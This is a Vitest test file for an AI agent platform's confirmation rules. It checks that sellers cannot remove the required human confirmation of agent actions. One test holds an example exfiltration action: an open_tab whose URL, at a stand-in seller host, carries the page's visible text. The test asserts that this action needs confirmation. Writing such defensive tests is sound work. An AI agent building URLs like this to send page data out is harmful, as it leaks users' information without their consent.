import { describe, it, expect } from 'vitest'

import { PLATFORM_CONFIRM, needsConfirmation, withPlatformConfirm } from './confirmation'
import { parseAgentManifest } from './manifest'
import { AGENT_MANIFEST_SCHEMA } from './types/agent'

describe('platform confirmation minimum', () => {
  it('cannot be removed by an empty list', () => {
    for (const type of PLATFORM_CONFIRM) {
      expect(needsConfirmation({ type, params: { url: 'https://example.com' } }, [])).toBe(true)
    }
  })

  it('lets an agent add actions on top', () => {
    expect(needsConfirmation({ type: 'click' }, ['click'])).toBe(true)
    expect(needsConfirmation({ type: 'click' }, [])).toBe(false)
    expect(withPlatformConfirm(['click'])).toEqual(expect.arrayContaining([...PLATFORM_CONFIRM, 'click']))
  })

  it('confirms an open_tab whose URL is built from run data (exfiltration)', () => {
    const exfil = { type: 'open_tab' as const, params: { url: 'https://seller.example/c?d={{page.visible_text}}' } }
    expect(needsConfirmation(exfil, [])).toBe(true)
  })

  it('does not confirm an open_tab to a fixed URL unless asked', () => {
    expect(needsConfirmation({ type: 'open_tab', params: { url: 'https://example.com/docs' } }, [])).toBe(false)
    expect(needsConfirmation({ type: 'open_tab', params: { url: 'https://example.com/docs' } }, ['open_tab'])).toBe(true)
  })

  it('ignores placeholders in non-URL actions', () => {
    expect(needsConfirmation({ type: 'type', params: { text: '{{name}}' } }, [])).toBe(false)
  })
})

describe('parseAgentManifest require_confirmation', () => {
  const base = {
    schema: AGENT_MANIFEST_SCHEMA,
    name: 'Confirm Test',
    slug: 'confirm-test',
    version: '1.0.0',
    description: 'Checks the confirmation floor.',
    category: 'sales',
    goal: 'Test the confirmation floor',
    capabilities: ['read_page', 'navigate'],
    triggers: [{ type: 'manual', surface: 'sidebar' }],
    deploy: { targets: ['extension'], min_plan: 'free' },
  }

  it('restores the platform minimum when a seller ships an empty list', () => {
    const result = parseAgentManifest({ ...base, harness: { require_confirmation: [] } })
    if (!result.ok) throw new Error(JSON.stringify(result))
    expect(result.value.harness.require_confirmation).toEqual(expect.arrayContaining([...PLATFORM_CONFIRM]))
  })

  it('includes push_integration by default', () => {
    const result = parseAgentManifest(base)
    if (!result.ok) throw new Error(JSON.stringify(result))
    expect(result.value.harness.require_confirmation).toContain('push_integration')
  })
})
